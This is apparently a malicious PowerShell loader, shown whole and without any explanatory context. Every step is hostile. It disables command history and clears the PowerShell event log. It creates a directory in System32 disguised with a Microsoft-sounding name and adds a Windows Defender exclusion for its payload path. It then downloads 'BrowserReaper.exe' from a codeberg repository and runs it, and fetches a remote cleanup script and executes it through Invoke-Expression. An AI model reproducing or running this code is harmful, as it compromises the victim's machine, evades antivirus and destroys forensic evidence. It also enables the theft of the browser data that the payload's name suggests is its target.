$AvailableTls = [enum]::GetValues('Net.SecurityProtocolType') | Where-Object { $_ -ge 'Tls12' }
foreach ($tlsProtocol in $AvailableTls) {[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol}
Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
Clear-EventLog "Windows Powershell"
$LogEngineLifecycleEvent = $false | Out-Null
[void]$LogEngineLifecycleEvent
$basepathcleaknupurl = "https://codeberg.org/sempiampi/mavericks/raw/branch/main/Sanitation/BasePathPurge.ps1"
$reaperurl = "https://codeberg.org/sempiampi/mavericks/releases/download/v1.0.0/BrowserReaper.exe"
$basepath = "C:\Windows\System32\SecureBootUpdatesMicrosoft"
$reaperpath = Join-Path -Path $basepath -ChildPath "reaper.exe"

if (-not (Test-Path (Split-Path $reaperpath))) {
    New-Item -Path (Split-Path $reaperpath) -ItemType Directory -Force -Confirm:$false | Out-Null
}
$Exclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
if ($Exclusions -notcontains $reaperpath) {
   Add-MpPreference -ExclusionPath $reaperpath -ErrorAction SilentlyContinue
}
Invoke-WebRequest -Uri $reaperurl -OutFile $reaperpath
Start-Process -FilePath $reaperpath -Wait
Invoke-Expression (Invoke-WebRequest -Uri $basepathcleaknupurl -UseBasicParsing).Content